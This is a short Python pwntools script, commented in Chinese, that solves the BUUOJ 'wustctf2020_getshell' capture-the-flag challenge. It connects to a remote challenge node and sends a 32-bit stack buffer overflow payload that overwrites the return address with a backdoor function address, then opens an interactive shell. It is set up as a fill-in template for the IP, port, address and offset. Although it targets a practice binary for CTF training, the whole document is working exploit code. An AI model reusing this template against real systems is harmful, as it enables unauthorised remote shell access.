from pwn import *  #导入pwntools包,运行pip install pwntools安装
context(log_level='debug',arch='i386',os='linux')
#先用file 命令判断是32还是64位

# 漏洞位置  scanf  read  gets
#远程
ip = "node5.buuoj.cn" #修改ip,  例如：127.0.0.1
prot = 25978          #修改端口
io=remote(ip,prot) 
back_door=0x804851B    #修改为后门函数地址
offest = 0x18          #修改偏移
payload=b'a' * offest + b'a'* 4 +p32(back_door) #拼接payload 不需要改
io.sendline(payload)  #发送数据，不需要改
io.interactive()      #建立连接，不需要改

"""
https://buuoj.cn/challenges#wustctf2020_getshell 题目
"""